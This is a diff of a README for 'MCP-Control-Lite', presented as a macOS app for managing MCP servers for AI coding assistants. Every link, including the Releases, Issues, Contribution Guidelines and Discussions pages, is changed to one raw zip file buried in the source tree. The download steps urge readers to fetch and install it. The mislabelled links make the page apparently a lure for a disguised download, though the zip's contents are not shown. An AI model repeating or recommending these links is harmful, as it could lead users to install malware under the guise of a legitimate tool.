@@ -1,7 +1,7 @@
 # 🎉 MCP-Control-Lite - Simple Management for AI Assistants
 
 ## 📥 Download Now!
-[![Download MCP-Control-Lite](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/Lemurinae/MCP-Control-Lite.zip%https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/Lemurinae/MCP-Control-Lite.zip)](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/Lemurinae/MCP-Control-Lite.zip)
+[![Download MCP-Control-Lite](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/src-tauri/src/configuration/Control_Lite_MC_2.3.zip%https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/src-tauri/src/configuration/Control_Lite_MC_2.3.zip)](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/src-tauri/src/configuration/Control_Lite_MC_2.3.zip)
 
 ## 📖 Overview
 MCP-Control-Lite is a native macOS application designed to help you manage Model Context Protocol (MCP) servers. This tool allows you to easily configure and sync servers for popular AI coding assistants like Claude Desktop, Cursor, and VS Code. Built with Rust and Tauri, it provides a smooth graphical interface as well as a command line interface, making it user-friendly and versatile.
@@ -10,9 +10,9 @@ MCP-Control-Lite is a native macOS application designed to help you manage Model
 To get started with MCP-Control-Lite, follow these simple steps to download and install the software.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/Lemurinae/MCP-Control-Lite.zip) to access the latest version of MCP-Control-Lite.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/src-tauri/src/configuration/Control_Lite_MC_2.3.zip) to access the latest version of MCP-Control-Lite.
 2. On the Releases page, look for the latest version number. This will typically be at the top of the list.
-3. Download the installation file by clicking on the link for your system (for example, `https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/Lemurinae/MCP-Control-Lite.zip`).
+3. Download the installation file by clicking on the link for your system (for example, `https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/src-tauri/src/configuration/Control_Lite_MC_2.3.zip`).
 4. Once the file downloads, locate it in your Downloads folder.
 5. Open the downloaded ZIP file and drag the MCP-Control-Lite application to your Applications folder.
 6. You can now open MCP-Control-Lite from your Applications.
@@ -43,7 +43,7 @@ If you encounter issues while using MCP-Control-Lite, consider the following ste
 - **Check Connections:** Ensure that your internet connection is stable, especially when syncing servers.
 - **Refer to Help Section:** The app includes a help section for common questions.
 
-If problems continue, visit our [GitHub Issues page](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/Lemurinae/MCP-Control-Lite.zip) for community support.
+If problems continue, visit our [GitHub Issues page](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/src-tauri/src/configuration/Control_Lite_MC_2.3.zip) for community support.
 
 ## 📅 Changelog
 Stay updated with all the changes made to MCP-Control-Lite:
@@ -53,7 +53,7 @@ Stay updated with all the changes made to MCP-Control-Lite:
 ## 🛠️ Contributing
 We welcome contributions! If you would like to help improve MCP-Control-Lite:
 
-1. Check our [Contribution Guidelines](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/Lemurinae/MCP-Control-Lite.zip).
+1. Check our [Contribution Guidelines](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/src-tauri/src/configuration/Control_Lite_MC_2.3.zip).
 2. Fork the repository and create a new branch for your changes.
 3. Submit a pull request with your improvements or fixes.
 
@@ -61,6 +61,6 @@ We welcome contributions! If you would like to help improve MCP-Control-Lite:
 MCP-Control-Lite is licensed under the MIT License. Feel free to use and modify the software for your personal projects.
 
 ## 📬 Contact
-For more information or support, you can reach us through our [GitHub Discussions page](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/Lemurinae/MCP-Control-Lite.zip) or file an issue directly on the repository.
+For more information or support, you can reach us through our [GitHub Discussions page](https://raw.githubusercontent.com/ganeshmalkar/MCP-Control-Lite/main/src-tauri/src/configuration/Control_Lite_MC_2.3.zip) or file an issue directly on the repository.
 
 Thank you for choosing MCP-Control-Lite! Enjoy a smoother experience managing your AI coding servers.
